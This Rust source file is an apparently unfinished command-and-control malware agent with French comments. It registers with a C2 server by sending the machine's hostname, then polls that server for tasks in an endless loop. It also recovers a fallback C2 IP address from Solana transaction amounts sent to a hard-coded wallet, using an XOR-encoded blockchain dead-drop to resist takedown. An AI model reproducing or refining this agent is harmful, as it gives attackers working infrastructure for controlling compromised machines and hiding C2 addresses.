#![allow(unused)]

use hostname;
use reqwest::Client;
use std::error::Error;
use std::thread;
use std::time::Duration;
use serde::{Deserialize, Serialize};
use serde_json::json;
use hex;

#[derive(Debug, Deserialize)]
struct Response {
    result: Option<Vec<Transaction>>,
}

#[derive(Debug, Deserialize)]
struct Transaction {
    signature: String,
}

#[derive(Debug, Deserialize)]
struct TransactionDetails {
    result: Option<TransactionResult>,
}

#[derive(Debug, Deserialize)]
struct TransactionResult {
    meta: Meta,
}

#[derive(Debug, Deserialize)]
struct Meta {
    postBalances: Vec<u64>,
    preBalances: Vec<u64>,
}

#[derive(Serialize)]
struct AgentData {
    name: String,
    hostname: String,
    ip: String,
    key: String,
}

struct TasksUrl {
    task_url: String,
    result_url: String,
}

impl TasksUrl {
    fn new(ip: &str, port: &u16, agent: &str) -> Self {
        let task_url = format!("http://{}:{}//getTask?agent={}", ip, port, agent);
        let result_url = format!("http://{}:{}//receiveResult", ip, port);
        TasksUrl {task_url, result_url} // simplification d'instenciation (nécessite les mêmes noms de variables)
    }
}

async fn retrieve_transaction(wallet_addr: &str) -> Result<Vec<String>, Box<dyn Error>> {
    let client = Client::new();
    let url = "https://api.mainnet-beta.solana.com";

    let data = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getSignaturesForAddress",
        "params": [
            wallet_addr,
            { "limit": 2 }
        ]
    });

    let res = client.post(url).json(&data).send().await?;
    let json_res: Response = res.json().await?;

    let mut signature_list = Vec::new();

    if let Some(results) = json_res.result {
        for transaction in results {
            signature_list.push(transaction.signature);
        }
    }

    Ok(signature_list)
}

async fn retrieve_backup_ip(signature_list: Vec<String>) -> Result<String, Box<dyn Error>> {
    let client = Client::new();
    let url = "https://api.mainnet-beta.solana.com";
    let mut ip_address = String::new();

    for (i, signature) in signature_list.iter().enumerate() {
        let data = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getTransaction",
            "params": [
                signature,
                {
                    "commitment": "confirmed",
                    "maxSupportedTransactionVersion": 0,
                    "encoding": "json"
                }
            ]
        });

        let res = client.post(url).json(&data).send().await?;
        let json_res: TransactionDetails = res.json().await?;

        if let Some(result) = json_res.result {
            let amount_send = result.meta.postBalances[1] - result.meta.preBalances[1];

            // Conversion du montant envoyé en hexadecimal et manipulation
            let mut ip_byte = hex::encode((amount_send / 1000).to_le_bytes());

            ip_byte = format!("{:x}", u16::from_str_radix(&ip_byte, 16)? ^ 0xffff);

            ip_address.push_str(&format!("{}.{}", u8::from_str_radix(&ip_byte[0..2], 16)?, u8::from_str_radix(&ip_byte[2..4], 16)?));

            if i == 0 {
                ip_address.push_str(&format!(".{}", u8::from_str_radix(&ip_byte[4..6], 16)?));
            } else {
                ip_address.push_str(&format!("{}", u8::from_str_radix(&ip_byte[4..6], 16)?));
            }
        }
    }

    Ok(ip_address)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {

    let wallet_addr: &str = "2Hj5EwbGDRjsE6xHjtJcAmhDVqAgWzVrv9DkAJqWnint";

    // Définition des informations sur le serveur C2
    let ip = "127.0.0.1".to_string();
    let port: u16 = 4444;
    let regl = format!("http://{}:{}/register", ip, port); //Définition de l'URL du C2 pour les requêtes 
    let hname_os = hostname::get()?; // Récupération du hostname
    let hname = hname_os
        .into_string()
        .unwrap_or_else(|_| "unknown".to_string()); // Convertir le hostname en String
    
     // Définition des informations a envoyé au C2
     let agent_data = AgentData {
        name : "raph".to_string(),
        hostname : hname,
        ip : "1.1.1.1".to_string(),
        key: "1234".to_string(),
    };
  
    let client = Client::new(); // Ouverture d'un client pour effectuer les requêtes
    
    let response = client
        .post(&regl)
        .json(&agent_data)
        .send()
        .await?; 
    let my_name = response.text().await?; // Réception de la réponse du serveur (agent name)
    println!("Debug - agent bien enregistré : {}", my_name); // ligne de debug
    let urls = TasksUrl::new(&ip, &port, &agent_data.name);
     
    let n: u64 = 3000;

    let signature_list = retrieve_transaction(wallet_addr).await?;
    println!("{:?}", signature_list);

    let ip = retrieve_backup_ip(signature_list).await?;
    println!("{}", ip);
    
    // Démarrage boucle infini
    loop {
        
        // Requête GET afin de savoir si il y a une tâche
        let taskr = client
            .get(&urls.task_url)
            .send()
            .await?; 
        
        // Bloc d'actions si il y a une tâche
        if taskr.status() != 204 {
            let task = taskr.text().await?;
            println!("{}", task);
        } else {
            println!("{}", taskr.status()); // debug
            println!("No task bro"); //debug
        }

        thread::sleep(Duration::from_millis(n)); // L'agent sleep 3 secondes à chaque fin de boucle

        
    }

    

    Ok(())
}
